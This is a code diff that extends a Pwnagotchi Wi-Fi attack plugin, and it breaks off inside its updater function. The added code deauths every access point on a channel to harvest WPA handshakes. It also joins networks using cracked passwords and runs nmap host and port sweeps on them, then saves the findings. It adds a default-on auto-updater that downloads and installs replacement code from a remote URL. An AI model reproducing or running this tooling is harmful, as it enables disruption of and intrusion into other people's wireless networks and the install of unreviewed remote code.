@@ -46,22 +46,32 @@ start). RELEASE / on_unload reverts it to managed.
 
 import csv
 import glob
+import hashlib
+import json
 import logging
 import os
 import re
 import shutil
 import signal
+import socket
 import subprocess
+import tempfile
 import threading
 import time
+import urllib.request
 from html import escape
 
 import pwnagotchi.plugins as plugins
 
 
+_DEFAULT_UPDATE_URL = (
+    "https://raw.githubusercontent.com/Deloril/pwn-plugins/main/wd_scanner/wd_scanner.py"
+)
+
+
 class WdScanner(plugins.Plugin):
     __author__ = "you@example.com"
-    __version__ = "1.0.0"
+    __version__ = "1.3.0"
     __license__ = "GPL3"
     __description__ = (
         "Use a second radio to scan for SSIDs/clients and selectively deauth "
@@ -83,6 +93,16 @@ class WdScanner(plugins.Plugin):
         self._iface_cfg = None              # currently selected aux iface (user-picked)
         self._mon_iface = None              # actual mon iface after airmon-ng (e.g. wlan1mon)
         self._select_error = None           # last selection error to surface in UI
+        # When the chosen iface is on the same phy as pwnagotchi's main radio
+        # we run in "shared" mode: scans come from bettercap's session data
+        # (no second monitor vif on the same radio), and attacks pause/resume
+        # pwnagotchi's normal recon to keep the radio pinned during the
+        # capture window.
+        self._shared_radio = False
+        self._was_paused = False
+        # `True` iff the user has explicitly selected the main radio in
+        # shared mode. Useful for UI badges.
+        self._allow_shared = True
 
         self._scan_thread = None
         self._scan_running = False
@@ -94,23 +114,84 @@ class WdScanner(plugins.Plugin):
         self._action_running = False
         self._action_log = []               # rolling log of last attack
 
+        # Recon-on-pwned state.
+        self._recon_thread = None
+        self._recon_running = False
+        self._recon_log = []
+        self._recon_seconds = 60             # nmap timeout cap
+        self._recon_subnet_max = 256         # never sweep more than /24
+        self._recon_dwell = 8                # seconds to wait for DHCP
+        # Channel shotgun config.
+        self._shotgun_listen_seconds = 30
+        self._shotgun_burst_per_bssid = 3
+
+        # Auto-updater state.
+        self._update_url = _DEFAULT_UPDATE_URL
+        self._update_check_interval = 24 * 3600   # seconds between checks
+        self._update_auto_install = True
+        self._update_lock = threading.Lock()
+        self._update_thread = None
+        self._update_in_flight = False
+        self._update_last_check = 0          # epoch
+        self._update_last_status = None      # "up-to-date" / "update available" / error string
+        self._update_remote_version = None   # parsed __version__ from remote
+        self._update_remote_sha = None       # sha256 of remote bytes
+        self._update_local_sha = None
+        self._update_pending_restart = False  # set after a successful install
+
     def on_loaded(self):
         opts = self.options or {}
         self._scan_seconds = int(opts.get("scan_seconds", 15))
         self._listen_seconds = int(opts.get("deauth_listen_seconds", 30))
         self._deauth_bursts = int(opts.get("deauth_bursts", 5))
 
+        # Updater config.
+        self._update_url = str(opts.get("update_url", _DEFAULT_UPDATE_URL))
+        self._update_check_interval = int(opts.get("update_check_interval", 24 * 3600))
+        self._update_auto_install = bool(opts.get("update_auto_install", True))
+
+        # Shared-radio mode (single-radio fallback). Default ON so a Pi Zero
+        # with one Wi-Fi adapter Just Works.
+        self._allow_shared = bool(opts.get("allow_shared", True))
+
+        # Recon-on-pwned config.
+        self._recon_seconds = int(opts.get("recon_seconds", 60))
+        self._recon_subnet_max = int(opts.get("recon_subnet_max", 256))
+        self._recon_dwell = int(opts.get("recon_dhcp_dwell", 8))
+
+        # Shotgun config.
+        self._shotgun_listen_seconds = int(
+            opts.get("shotgun_listen_seconds", 30)
+        )
+        self._shotgun_burst_per_bssid = int(
+            opts.get("shotgun_burst_per_bssid", 3)
+        )
+
         if shutil.which("airodump-ng") is None or shutil.which("airmon-ng") is None:
             logging.error("[wd_scanner] aircrack-ng suite not found on PATH.")
             return
 
+        try:
+            self._update_local_sha = self._sha256_of_self()
+        except Exception:
+            self._update_local_sha = None
+
         logging.info(
-            "[wd_scanner] loaded; pick an aux radio from /plugins/wd_scanner/"
+            "[wd_scanner] loaded v%s; pick an aux radio from /plugins/wd_scanner/",
+            self.__version__,
         )
 
     def on_ready(self, agent):
         self._agent = agent
         logging.info("[wd_scanner] agent ready, plugin armed.")
+
+    def on_internet_available(self, agent):
+        # Pwnagotchi calls this periodically while online. We rate-limit
+        # ourselves to update_check_interval to avoid hammering GitHub.
+        try:
+            self._maybe_run_update_check(force=False)
+        except Exception:
+            logging.exception("[wd_scanner] auto-update check failed")
 
     def on_unload(self, ui):
         try:
@@ -132,9 +213,13 @@ class WdScanner(plugins.Plugin):
 
     def _list_wireless_ifaces(self):
         """
-        Return [{name, type, addr, busy}] for every wireless device on the
-        machine, EXCLUDING the interface pwnagotchi/bettercap is using.
-        type is 'managed' / 'monitor' / 'unknown'.
+        Return [{name, type, addr, shared, role}] for every wireless device.
+
+        - `type` is the iw mode: 'managed' / 'monitor' / 'unknown'.
+        - `shared` is True if this iface lives on the same phy as
+          pwnagotchi's main radio (i.e. selecting it means pausing
+          pwnagotchi during scans/attacks).
+        - `role` is 'dedicated' or 'shared' for the UI.
         """
         names = []
         try:
@@ -145,31 +230,27 @@ class WdScanner(plugins.Plugin):
         except FileNotFoundError:
             pass
 
-        # Best-effort: also look at `iw dev` for vifs that don't always
-        # show up under /sys/class/net by name.
         iw_out = self._run(["iw", "dev"], check=False, timeout=5) or ""
         for m in re.finditer(r"Interface\s+(\S+)", iw_out):
             n = m.group(1)
             if n not in names:
                 names.append(n)
 
-        # Compute the busy set: pwnagotchi's main iface, plus any phy that
-        # backs it (so we don't accidentally clobber the same radio under a
-        # different vif name).
-        busy = set()
         main_iface = pwnagotchi_config_main_iface()
+        main_phy = self._iface_phy(main_iface) if main_iface else None
+        # Hide bettercap's own monitor vif (e.g. mon0 for wlan0): showing it
+        # only confuses the user, and selecting it would yank the radio out
+        # from under bettercap mid-attack.
+        hide = set()
         if main_iface:
-            busy.add(main_iface)
-            phy = self._iface_phy(main_iface)
-            if phy:
-                for n in list(names):
-                    if self._iface_phy(n) == phy:
-                        busy.add(n)
+            hide.add(main_iface)
 
         result = []
         for n in names:
-            if n in busy:
+            if n in hide:
                 continue
+            phy = self._iface_phy(n)
+            shared = bool(main_phy and phy == main_phy)
             info = self._run(["iw", "dev", n, "info"], check=False, timeout=3) or ""
             if "type monitor" in info:
                 t = "monitor"
@@ -183,7 +264,16 @@ class WdScanner(plugins.Plugin):
                     addr = f.read().strip()
             except OSError:
                 pass
-            result.append({"name": n, "type": t, "addr": addr})
+            result.append({
+                "name": n,
+                "type": t,
+                "addr": addr,
+                "shared": shared,
+                "role": "shared" if shared else "dedicated",
+            })
+
+        # Sort: dedicated radios first, then shared. Stable inside each group.
+        result.sort(key=lambda i: (1 if i["shared"] else 0, i["name"]))
         return result
 
     def _iface_phy(self, iface):
@@ -197,7 +287,7 @@ class WdScanner(plugins.Plugin):
     # ---------------------------------------------------------- iface selection
 
     def _select_iface(self, name):
-        """User picked an iface in the UI. Validate, claim, put in monitor."""
+        """User picked an iface in the UI. Validate, claim, prep for use."""
         with self._lock:
             self._select_error = None
 
@@ -210,20 +300,39 @@ class WdScanner(plugins.Plugin):
             if not os.path.isdir("/sys/class/net/%s" % name):
                 return False, "%s does not exist" % name
 
-            # Make sure it's not the pwnagotchi main radio (or a vif on its phy).
             main_iface = pwnagotchi_config_main_iface()
+            shared = False
             if main_iface:
                 if name == main_iface:
-                    return False, "%s is pwnagotchi's main radio" % name
-                phy = self._iface_phy(main_iface)
-                if phy and self._iface_phy(name) == phy:
-                    return False, "%s is on the same phy (%s) as pwnagotchi's main radio" % (name, phy)
+                    if not self._allow_shared:
+                        return False, "%s is pwnagotchi's main radio" % name
+                    shared = True
+                else:
+                    main_phy = self._iface_phy(main_iface)
+                    if main_phy and self._iface_phy(name) == main_phy:
+                        if not self._allow_shared:
+                            return (
+                                False,
+                                "%s is on the same phy (%s) as pwnagotchi's main radio"
+                                % (name, main_phy),
+                            )
+                        shared = True
 
             # If a different iface was previously selected, release it first.
             if self._mon_iface and self._mon_iface != name and self._iface_cfg != name:
                 self._restore_managed_mode()
 
             self._iface_cfg = name
+            self._shared_radio = shared
+
+            if shared:
+                # Don't try to add a second monitor vif on the same phy.
+                # Bettercap is already in monitor mode on this radio; we'll
+                # piggy-back on its scan and attack APIs and just pause/
+                # resume around our work.
+                self._mon_iface = main_iface  # for display only
+                return True, "selected %s (shared with pwnagotchi)" % name
+
             mon = self._ensure_monitor_mode()
             if not mon:
                 self._select_error = "could not enable monitor mode on %s" % name
@@ -235,11 +344,52 @@ class WdScanner(plugins.Plugin):
         with self._lock:
             if self._scan_running or self._action_running:
                 return False, "busy: scan or attack in progress"
-            self._restore_managed_mode()
+            if self._shared_radio:
+                # Make sure pwnagotchi is back to normal even if a worker
+                # crashed without resuming it.
+                self._resume_pwnagotchi()
+                self._shared_radio = False
+                self._mon_iface = None
+            else:
+                self._restore_managed_mode()
             self._iface_cfg = None
             self._last_scan_results = []
             self._last_scan_error = None
             return True, "released"
+
+    # ------------------------------------------------- pwnagotchi pause/resume
+
+    def _pause_pwnagotchi(self):
+        """Tell bettercap to stop using the radio while we work."""
+        if self._was_paused:
+            return
+        agent = self._agent
+        if agent is None:
+            return
+        try:
+            agent.run("wifi.recon off")
+            self._log_action("paused pwnagotchi recon (shared radio)")
+            self._was_paused = True
+        except Exception as e:
+            self._log_action("could not pause pwnagotchi: %s" % e)
+
+    def _resume_pwnagotchi(self):
+        agent = self._agent
+        if agent is None or not self._was_paused:
+            self._was_paused = False
+            return
+        try:
+            # Clear any pinned channel and get hopping again.
+            try:
+                agent.run("wifi.recon.channel clear")
+            except Exception:
+                pass
+            agent.run("wifi.recon on")
+            self._log_action("resumed pwnagotchi recon")
+        except Exception as e:
+            self._log_action("could not resume pwnagotchi: %s" % e)
+        finally:
+            self._was_paused = False
 
     # ------------------------------------------------------------- monitor mode
 
@@ -294,20 +444,84 @@ class WdScanner(plugins.Plugin):
         with self._lock:
             if self._scan_running:
                 return False, "scan already running"
-            if not self._ensure_monitor_mode():
+            if not self._shared_radio and not self._ensure_monitor_mode():
                 return False, "monitor mode unavailable on %s" % self._iface_cfg
             seconds = int(seconds or self._scan_seconds)
             self._scan_running = True
             self._scan_started_at = time.time()
             self._last_scan_error = None
+            target = (
+                self._scan_worker_shared
+                if self._shared_radio
+                else self._scan_worker
+            )
             self._scan_thread = threading.Thread(
-                target=self._scan_worker, args=(seconds,), daemon=True
+                target=target, args=(seconds,), daemon=True,
             )
             self._scan_thread.start()
             return True, "scan started for %ds" % seconds
 
     def _stop_scan(self):
         self._scan_running = False
+
+    def _scan_worker_shared(self, seconds):
+        """Shared-radio scan: poll bettercap session for `seconds`, aggregate."""
+        agent = self._agent
+        try:
+            if agent is None:
+                self._last_scan_error = "agent not ready"
+                return
+            self._log_action(
+                "shared-radio scan: harvesting bettercap session for %ds" % seconds
+            )
+            deadline = time.time() + seconds
+            best = {}  # bssid -> ap dict
+            while time.time() < deadline and self._scan_running:
+                try:
+                    sess = agent.session() or {}
+                    aps = (sess.get("wifi") or {}).get("aps") or []
+                except Exception as e:
+                    self._last_scan_error = "session error: %s" % e
+                    return
+                for a in aps:
+                    bssid = (a.get("mac") or a.get("bssid") or "").lower()
+                    if not re.match(r"^[0-9a-f:]{17}$", bssid):
+                        continue
+                    ssid = a.get("hostname") or a.get("ssid") or "<hidden>"
+                    try:
+                        ch = int(a.get("channel") or 0)
+                    except (TypeError, ValueError):
+                        ch = 0
+                    try:
+                        rssi = int(a.get("rssi") or -100)
+                    except (TypeError, ValueError):
+                        rssi = -100
+                    clients = a.get("clients") or []
+                    cl = len(clients) if isinstance(clients, list) else 0
+                    cur = best.get(bssid)
+                    # Keep the strongest reading we've seen.
+                    if (cur is None) or (rssi > cur["power"]):
+                        best[bssid] = {
+                            "bssid": bssid,
+                            "channel": ch,
+                            "power": rssi,
+                            "ssid": ssid or "<hidden>",
+                            "clients": cl,
+                        }
+                    elif cl > cur["clients"]:
+                        cur["clients"] = cl
+                time.sleep(1.5)
+
+            results = list(best.values())
+            def _rank(a):
+                p = a["power"]
+                if p == -1:
+                    p = -100
+                return -p
+            results.sort(key=_rank)
+            self._last_scan_results = results
+        finally:
+            self._scan_running = False
 
     def _scan_worker(self, seconds):
         tmpdir = "/tmp/wd_scanner"
@@ -436,8 +650,8 @@ class WdScanner(plugins.Plugin):
 
     def _start_attack(self, bssid, channel, ssid):
         with self._lock:
-            if self._action_running:
-                return False, "an attack is already running"
+            if self._action_running or self._recon_running:
+                return False, "an attack/recon is already running"
             if self._agent is None:
                 return False, "agent not ready yet"
             self._action_running = True
@@ -450,6 +664,23 @@ class WdScanner(plugins.Plugin):
             self._action_thread.start()
             return True, "attack queued"
 
+    def _start_shotgun(self, channel):
+        """Deauth every BSSID currently visible on `channel`, listen for handshakes."""
+        with self._lock:
+            if self._action_running or self._recon_running:
+                return False, "an attack/recon is already running"
+            if self._agent is None:
+                return False, "agent not ready yet"
+            self._action_running = True
+            self._action_log = []
+            self._action_thread = threading.Thread(
+                target=self._shotgun_worker,
+                args=(int(channel),),
+                daemon=True,
+            )
+            self._action_thread.start()
+            return True, "shotgun queued"
+
     def _log_action(self, msg):
         ts = time.strftime("%H:%M:%S")
         line = "[%s] %s" % (ts, msg)
@@ -458,9 +689,86 @@ class WdScanner(plugins.Plugin):
             self._action_log = self._action_log[-200:]
         logging.info("[wd_scanner] %s", msg)
 
+    def _shotgun_worker(self, channel):
+        """
+        Channel-shotgun: pin the radio, fire a deauth burst at every BSSID
+        we've seen on this channel (subset of self._last_scan_results), then
+        sleep `shotgun_listen_seconds` so bettercap can record any reauth
+        handshakes, then release the channel.
+        """
+        agent = self._agent
+        try:
+            targets = [
+                a for a in (self._last_scan_results or [])
+                if int(a.get("channel") or 0) == int(channel)
+            ]
+            if not targets:
+                self._log_action(
+                    "shotgun ch%d: no BSSIDs known on this channel; run a scan first"
+                    % channel
+                )
+                return
+
+            self._log_action(
+                "shotgun ch%d: %d targets, %d bursts each, %ds capture window"
+                % (channel, len(targets), self._shotgun_burst_per_bssid,
+                   self._shotgun_listen_seconds)
+            )
+            try:
+                agent.run("wifi.recon.channel %d" % channel)
+            except Exception as e:
+                self._log_action("channel pin failed: %s" % e)
+                return
+
+            # Round-robin the bursts so every BSSID gets an early hit, rather
+            # than blasting one BSSID 3x then the next 3x. This wakes more
+            # clients in parallel.
+            for round_idx in range(self._shotgun_burst_per_bssid):
+                for ap in targets:
+                    bssid = ap["bssid"]
+                    try:
+                        agent.run("wifi.deauth %s" % bssid)
+                        self._log_action(
+                            "ch%d burst %d/%d -> %s (%s)"
+                            % (channel, round_idx + 1,
+                               self._shotgun_burst_per_bssid,
+                               bssid, ap.get("ssid") or "?")
+                        )
+                    except Exception as e:
+                        self._log_action("deauth error %s: %s" % (bssid, e))
+                    # tiny gap between BSSIDs so we don't drown each other
+                    time.sleep(0.25)
+                time.sleep(1)
+
+            handshake_dir = self._handshake_dir()
+            before = self._snapshot_handshakes(handshake_dir)
+            self._log_action(
+                "shotgun ch%d: listening %ds for reauths (dir=%s)"
+                % (channel, self._shotgun_listen_seconds, handshake_dir)
+            )
+            time.sleep(self._shotgun_listen_seconds)
+            after = self._snapshot_handshakes(handshake_dir)
+            new = sorted(set(after) - set(before))
+            if new:
+                for n in new:
+                    self._log_action("captured handshake: %s" % n)
+            else:
+                self._log_action("shotgun ch%d: no new handshakes" % channel)
+        finally:
+            try:
+                agent.run("wifi.recon.channel clear")
+                self._log_action("released channel pin (control back to bettercap)")
+            except Exception as e:
+                self._log_action("could not clear channel pin: %s" % e)
+            self._action_running = False
+
     def _attack_worker(self, bssid, channel, ssid):
         agent = self._agent
         try:
+            if self._shared_radio:
+                self._log_action(
+                    "shared-radio attack: pwnagotchi paused while we capture"
+                )
             self._log_action("pinning main radio to channel %d for %s (%s)"
                              % (channel, ssid, bssid))
             try:
@@ -501,6 +809,407 @@ class WdScanner(plugins.Plugin):
             except Exception as e:
                 self._log_action("could not clear channel pin: %s" % e)
             self._action_running = False
+
+    # -------------------------------------------------------------- recon
+
+    def _log_recon(self, msg):
+        ts = time.strftime("%H:%M:%S")
+        line = "[%s] %s" % (ts, msg)
+        self._recon_log.append(line)
+        if len(self._recon_log) > 400:
+            self._recon_log = self._recon_log[-400:]
+        logging.info("[wd_scanner.recon] %s", msg)
+
+    def _start_recon(self, ssid, bssid, password):
+        """Connect to a known-pwned network and run a recon sweep."""
+        with self._lock:
+            if self._action_running or self._recon_running:
+                return False, "an attack/recon is already running"
+            if self._agent is None:
+                return False, "agent not ready yet"
+            if not password or password == "<recovered>":
+                return False, "no password on file for this network"
+            self._recon_running = True
+            self._recon_log = []
+            self._recon_thread = threading.Thread(
+                target=self._recon_worker,
+                args=(ssid, bssid, password),
+                daemon=True,
+            )
+            self._recon_thread.start()
+            return True, "recon queued"
+
+    def _pick_recon_iface(self):
+        """
+        Decide which physical interface we'll use for recon. We need a
+        managed-mode capable iface. Strategy:
+          - Prefer a dedicated radio (not the one bettercap is on).
+          - Otherwise fall back to whatever phy backs pwnagotchi's main
+            radio: take down the monitor vif, bring the parent up in
+            managed mode.
+
+        Returns (iface_name, was_shared) or (None, None) on failure.
+        """
+        main_iface = pwnagotchi_config_main_iface()
+        main_phy = self._iface_phy(main_iface) if main_iface else None
+
+        # Look for a dedicated radio first.
+        for it in self._list_wireless_ifaces():
+            if not it.get("shared") and it.get("name") != main_iface:
+                return it["name"], False
+
+        # Fall back to the parent of pwnagotchi's monitor vif.
+        # main_iface is usually `mon0`; we want the parent (`wlan0`).
+        if main_phy:
+            try:
+                for n in os.listdir("/sys/class/net"):
+                    if not os.path.exists("/sys/class/net/%s/phy80211" % n):
+                        continue
+                    if n == main_iface:
+                        continue
+                    if self._iface_phy(n) == main_phy:
+                        return n, True
+            except OSError:
+                pass
+
+        # Last resort: use the main iface itself.
+        if main_iface:
+            return main_iface, True
+        return None, None
+
+    @staticmethod
+    def _wpa_psk_safe(s):
+        # wpa_supplicant config string. Quote-it-yourself style; we just
+        # refuse anything containing a quote or newline.
+        return s and "\"" not in s and "\n" not in s and "\r" not in s
+
+    def _recon_worker(self, ssid, bssid, password):
+        """Body of the recon job. Runs in its own thread."""
+        agent = self._agent
+        iface, was_shared = self._pick_recon_iface()
+        if not iface:
+            self._log_recon("no usable interface for recon")
+            self._recon_running = False
+            return
+
+        self._log_recon("recon target: %s (%s)" % (ssid, bssid))
+        self._log_recon("recon iface: %s%s" % (
+            iface, " (shared with pwnagotchi)" if was_shared else ""
+        ))
+
+        # Tooling check.
+        if not shutil.which("wpa_supplicant") or not shutil.which("dhclient"):
+            self._log_recon("wpa_supplicant/dhclient missing — install wpasupplicant + isc-dhcp-client")
+            self._recon_running = False
+            return
+        if not shutil.which("nmap"):
+            self._log_recon("nmap not on PATH; install with `apt-get install nmap`")
+
+        if not self._wpa_psk_safe(password):
+            self._log_recon("password contains illegal characters; aborting")
+            self._recon_running = False
+            return
+
+        # Build the config file.
+        tmpdir = tempfile.mkdtemp(prefix="wd_recon_")
+        wpa_conf = os.path.join(tmpdir, "wpa_supplicant.conf")
+        wpa_pid = os.path.join(tmpdir, "wpa_supplicant.pid")
+        wpa_ctrl = os.path.join(tmpdir, "ctrl")
+        dhcp_pid = os.path.join(tmpdir, "dhclient.pid")
+        dhcp_lease = os.path.join(tmpdir, "dhclient.leases")
+
+        try:
+            os.makedirs(wpa_ctrl, exist_ok=True)
+        except OSError:
+            pass
+        try:
+            with open(wpa_conf, "w") as f:
+                f.write(
+                    "ctrl_interface=" + wpa_ctrl + "\n"
+                    "update_config=0\n"
+                    "network={\n"
+                    "  ssid=\"" + ssid + "\"\n"
+                    "  psk=\"" + password + "\"\n"
+                    "  scan_ssid=1\n"
+                    "  key_mgmt=WPA-PSK\n"
+                    "}\n"
+                )
+            os.chmod(wpa_conf, 0o600)
+        except OSError as e:
+            self._log_recon("couldn't write wpa config: %s" % e)
+            self._recon_running = False
+            return
+
+        result = {
+            "ts": int(time.time()),
+            "ssid": ssid,
+            "bssid": bssid,
+            "iface": iface,
+            "ip": None,
+            "gateway": None,
+            "subnet": None,
+            "alive_hosts": [],
+            "ports": {},        # ip -> [open ports]
+            "names": {},         # ip -> reverse DNS
+            "log": [],
+            "duration_seconds": 0,
+        }
+
+        t0 = time.time()
+        bettercap_paused_here = False
+        wpa_started = False
+
+        try:
+            # 1. Pause pwnagotchi/bettercap so the radio is free for managed.
+            try:
+                agent.run("wifi.recon off")
+                self._log_recon("paused bettercap recon")
+                bettercap_paused_here = True
+            except Exception as e:
+                self._log_recon("could not pause bettercap: %s" % e)
+
+            # If our iface is currently a monitor vif, take it down and put
+            # it back to managed. Same for shared mode where the parent radio
+            # might still be in monitor.
+            self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
+            self._run(["iw", "dev", iface, "set", "type", "managed"],
+                      check=False, timeout=5)
+            self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
+
+            # 2. Start wpa_supplicant in the background.
+            self._log_recon("associating with %s ..." % ssid)
+            self._run([
+                "wpa_supplicant",
+                "-B",
+                "-D", "nl80211,wext",
+                "-i", iface,
+                "-c", wpa_conf,
+                "-P", wpa_pid,
+            ], check=False, timeout=10)
+            wpa_started = True
+
+            # 3. dhclient.
+            self._log_recon("requesting DHCP lease (dwell=%ds)..." % self._recon_dwell)
+            self._run([
+                "dhclient",
+                "-pf", dhcp_pid,
+                "-lf", dhcp_lease,
+                "-1",
+                "-timeout", str(self._recon_dwell),
+                iface,
+            ], check=False, timeout=self._recon_dwell + 5)
+
+            ip = self._iface_ipv4(iface)
+            gw = self._iface_default_gw()
+            if not ip:
+                self._log_recon("no IPv4 acquired; aborting recon")
+                return
+            result["ip"], result["gateway"] = ip, gw
+            self._log_recon("ip=%s gw=%s" % (ip, gw or "?"))
+
+            # 4. Compute subnet, capped to /24.
+            net_base, net_mask = self._derive_subnet(ip)
+            result["subnet"] = "%s/%d" % (net_base, net_mask)
+            host_count = (1 << (32 - net_mask)) - 2
+            if host_count > self._recon_subnet_max:
+                self._log_recon(
+                    "subnet /%d has %d hosts, capping to first %d"
+                    % (net_mask, host_count, self._recon_subnet_max)
+                )
+
+            # 5. Ping sweep (nmap -sn). Bound by recon_seconds.
+            sweep_target = "%s/%d" % (net_base, net_mask)
+            sweep_seconds = max(8, self._recon_seconds // 2)
+            self._log_recon(
+                "nmap ping sweep on %s (timeout %ds)" % (sweep_target, sweep_seconds)
+            )
+            sweep_out = self._run([
+                "nmap", "-sn", "-n",
+                "--max-retries", "1",
+                "--host-timeout", str(sweep_seconds) + "s",
+                "-T4",
+                sweep_target,
+            ], check=False, timeout=sweep_seconds + 10) or ""
+            alive = self._parse_nmap_alive(sweep_out)
+            # Always include the gateway if we know it.
+            if gw and gw not in alive:
+                alive.insert(0, gw)
+            alive = alive[: self._recon_subnet_max]
+            result["alive_hosts"] = alive
+            self._log_recon("alive hosts: %d" % len(alive))
+
+            # 6. Top-100 fast port scan, capped by remaining budget.
+            remaining = max(8, self._recon_seconds - (time.time() - t0))
+            if alive:
+                port_seconds = int(remaining)
+                self._log_recon(
+                    "nmap -F port scan on %d hosts (budget %ds)"
+                    % (len(alive), port_seconds)
+                )
+                ports_out = self._run([
+                    "nmap", "-Pn", "-n", "-F",
+                    "--max-retries", "1",
+                    "--host-timeout", str(max(5, port_seconds // max(1, len(alive)))) + "s",
+                    "-T4",
+                    "--open",
+                ] + alive,
+                    check=False, timeout=port_seconds + 15) or ""
+                result["ports"] = self._parse_nmap_ports(ports_out)
+
+            # 7. Reverse DNS via gateway.
+            for host in alive:
+                try:
+                    name = socket.gethostbyaddr(host)[0]
+                    if name and name != host:
+                        result["names"][host] = name
+                except (socket.herror, socket.gaierror, OSError):
+                    pass
+
+            self._log_recon(
+                "recon done: %d alive, %d with open ports, %d named"
+                % (len(alive), len(result["ports"]), len(result["names"]))
+            )
+        except Exception as e:
+            logging.exception("[wd_scanner] recon failed")
+            self._log_recon("recon failed: %s" % e)
+        finally:
+            # 8. Tear everything down.
+            self._run(["dhclient", "-r", "-pf", dhcp_pid, "-lf", dhcp_lease, iface],
+                      check=False, timeout=10)
+            if wpa_started:
+                self._run(["pkill", "-F", wpa_pid], check=False, timeout=5)
+                # If pkill -F failed (different /proc layout) try plain pkill.
+                self._run(["pkill", "-x", "wpa_supplicant"], check=False, timeout=5)
+
+            # Restore the iface to monitor mode if it was bettercap's.
+            if was_shared:
+                self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
+                self._run(["iw", "dev", iface, "set", "type", "monitor"],
+                          check=False, timeout=5)
+                self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
+
+            if bettercap_paused_here:
+                try:
+                    agent.run("wifi.recon on")
+                    self._log_recon("resumed bettercap recon")
+                except Exception as e:
+                    self._log_recon("could not resume bettercap: %s" % e)
+
+            # 9. Persist the report alongside the handshakes.
+            result["duration_seconds"] = round(time.time() - t0, 1)
+            result["log"] = list(self._recon_log)
+            try:
+                fname = self._recon_filename(bssid)
+                full = os.path.join(self._handshake_dir(), fname)
+                os.makedirs(self._handshake_dir(), exist_ok=True)
+                with open(full, "w") as f:
+                    json.dump(result, f, indent=2, default=str)
+                self._log_recon("report saved: %s" % fname)
+            except Exception as e:
+                self._log_recon("couldn't save report: %s" % e)
+
+            try:
+                shutil.rmtree(tmpdir, ignore_errors=True)
+            except Exception:
+                pass
+
+            self._recon_running = False
+
+    @staticmethod
+    def _recon_filename(bssid):
+        bsd = bssid.replace(":", "").lower()
+        return "wd_recon_%s_%d.json" % (bsd, int(time.time()))
+
+    @staticmethod
+    def _derive_subnet(ip):
+        """Return (network, prefix) clamped to /24 to keep the sweep finite."""
+        parts = ip.split(".")
+        if len(parts) != 4:
+            return ip, 32
+        return "%s.%s.%s.0" % (parts[0], parts[1], parts[2]), 24
+
+    def _iface_ipv4(self, iface):
+        out = self._run(["ip", "-4", "-o", "addr", "show", "dev", iface],
+                        check=False, timeout=5) or ""
+        m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out)
+        return m.group(1) if m else None
+
+    def _iface_default_gw(self):
+        out = self._run(["ip", "-4", "route", "show", "default"],
+                        check=False, timeout=5) or ""
+        m = re.search(r"default\s+via\s+(\d+\.\d+\.\d+\.\d+)", out)
+        return m.group(1) if m else None
+
+    @staticmethod
+    def _parse_nmap_alive(out):
+        hosts = []
+        # Matches both "Nmap scan report for 192.168.1.1" and
+        # "Nmap scan report for foo.local (192.168.1.1)".
+        pat = re.compile(r"Nmap scan report for (?:.+?\()?(\d+\.\d+\.\d+\.\d+)\)?")
+        for line in (out or "").splitlines():
+            m_ = pat.search(line)
+            if m_:
+                hosts.append(m_.group(1))
+        # de-dup, preserve order
+        seen = set(); ordered = []
+        for h in hosts:
+            if h in seen: continue
+            seen.add(h); ordered.append(h)
+        return ordered
+
+    @staticmethod
+    def _parse_nmap_ports(out):
+        """Map host -> [ {port, proto, service} ]. Best-effort plain-text parse."""
+        result = {}
+        host = None
+        pat = re.compile(r"Nmap scan report for (?:.+?\()?(\d+\.\d+\.\d+\.\d+)\)?")
+        for line in (out or "").splitlines():
+            m_h = pat.match(line)
+            if m_h:
+                host = m_h.group(1)
+                result.setdefault(host, [])
+                continue
+            if host:
+                m_p = re.match(r"^(\d+)/(tcp|udp)\s+open\s+(\S+)", line)
+                if m_p:
+                    result[host].append({
+                        "port": int(m_p.group(1)),
+                        "proto": m_p.group(2),
+                        "service": m_p.group(3),
+                    })
+        # drop hosts with no open ports
+        return {h: ps for h, ps in result.items() if ps}
+
+    def _list_recon_reports(self):
+        """Return reports sorted newest-first."""
+        path = self._handshake_dir()
+        if not path or not os.path.isdir(path):
+            return []
+        out = []
+        try:
+            for n in os.listdir(path):
+                if not (n.startswith("wd_recon_") and n.endswith(".json")):
+                    continue
+                full = os.path.join(path, n)
+                try:
+                    st = os.stat(full)
+                    out.append({"name": n, "path": full, "mtime": st.st_mtime})
+                except OSError:
+                    continue
+        except OSError:
+            return []
+        out.sort(key=lambda r: r["mtime"], reverse=True)
+        return out
+
+    def _load_recon_report(self, name):
+        if not re.match(r"^wd_recon_[0-9a-f]{12}_\d+\.json$", name or ""):
+            return None
+        full = os.path.join(self._handshake_dir(), name)
+        try:
+            with open(full, "r") as f:
+                return json.load(f)
+        except (OSError, ValueError):
+            return None
 
     def _load_cracked_index(self):
         """
@@ -580,6 +1289,7 @@ class WdScanner(plugins.Plugin):
                 idx[pretty] = password
             if essid_part:
                 idx["ssid::" + essid_part.lower()] = password
+                idx.setdefault("__origcase__::" + essid_part.lower(), essid_part)
 
         # Pattern B: a shared potfile (one entry per line).
         for fname in ("wpa-sec.cracked.potfile", "wpa-sec.potfile",
@@ -616,10 +1326,162 @@ class WdScanner(plugins.Plugin):
                         if essid:
                             idx.setdefault("ssid::" + essid.lower(),
                                            password or "<recovered>")
+                            idx.setdefault("__origcase__::" + essid.lower(), essid)
             except OSError:
                 continue
 
         return idx
+
+    # ----------------------------------------------------------------- updater
+
+    def _self_path(self):
+        """Absolute path to this plugin file on disk."""
+        return os.path.abspath(__file__)
+
+    def _sha256_of_self(self):
+        with open(self._self_path(), "rb") as f:
+            return hashlib.sha256(f.read()).hexdigest()
+
+    @staticmethod
+    def _parse_version(blob):
+        """Extract the value of __version__ from a chunk of source bytes/str."""
+        if isinstance(blob, bytes):
+            try:
+                blob = blob.decode("utf-8", errors="replace")
+            except Exception:
+                return None
+        m = re.search(r'__version__\s*=\s*[\'"]([^\'"]+)[\'"]', blob)
+        return m.group(1) if m else None
+
+    def _maybe_run_update_check(self, force=False):
+        """Kick a background thread to check for updates, rate-limited."""
+        with self._update_lock:
+            if self._update_in_flight:
+                return
+            now = time.time()
+            if (not force) and (now - self._update_last_check) < self._update_check_interval:
+                return
+            self._update_in_flight = True
+
+        t = threading.Thread(target=self._update_worker, args=(force,), daemon=True)
+        self._update_thread = t
+        t.start()
+
+    def _update_worker(self, force):
+        try:
